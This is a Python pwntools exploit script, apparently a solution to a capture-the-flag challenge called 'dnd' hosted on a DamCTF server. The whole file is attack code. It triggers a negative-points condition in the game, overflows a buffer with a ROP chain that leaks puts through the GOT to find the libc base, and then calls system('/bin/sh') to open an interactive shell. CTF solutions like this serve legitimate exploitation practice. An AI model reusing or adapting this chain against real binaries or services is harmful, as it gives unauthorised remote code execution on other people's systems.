from pwn import *
#io = process("./dnd")
io = remote("dnd.chals.damctf.xyz",30813)
elf = context.binary = ELF("./dnd")
libc = context.binary = ELF("./libc.so.6")

# Negative points to get input
def play_game():
    io.recvuntil(b"Do you want to [a]ttack or [r]un? ")
    io.sendline(b"a")
    io.recvuntil(b"Points: ")
    points = int(io.recvuntil(b"|").decode()[:-2])
    if points < 0:
        for _ in range(4):
            io.recv()
            io.sendline(b"r")
    else:
        print("Fail!")
        exit(1)


# === ret2libc ===
# 1. leak libc.puts
play_game()
# 0x0000000000402640 : pop rdi ; nop ; pop rbp ; ret
pop_rdi_addr = 0x402640
payload = flat (
         cyclic(104),
         p64(pop_rdi_addr),
         elf.got.puts,
         b"A"*8,
         elf.plt.puts,
         p64(0x0040286d) # win__ address
#         elf.sym.main,
        )
io.sendlineafter(b"fierce warrior?",payload)
io.recvline()

# 2. Get libc base address
leak = io.recvline().strip()
puts_libc = u64(leak.ljust(8, b"\x00"))
log.success(f"puts@libc: {hex(puts_libc)}")
libc.address = puts_libc - libc.sym.puts

# 3. Call system("/bin/sh")
sh = next(libc.search(b"/bin/sh\x00"))
ret_addr = pop_rdi_addr + 3
payload = flat (
         cyclic(104),
         p64(ret_addr),       # stack alignment
         p64(pop_rdi_addr),
         sh,
         b"A"*8,
         libc.sym['system'],
#         p64(0),              # stack alignment
        )
io.sendlineafter(b"fierce warrior?", payload)
io.interactive()
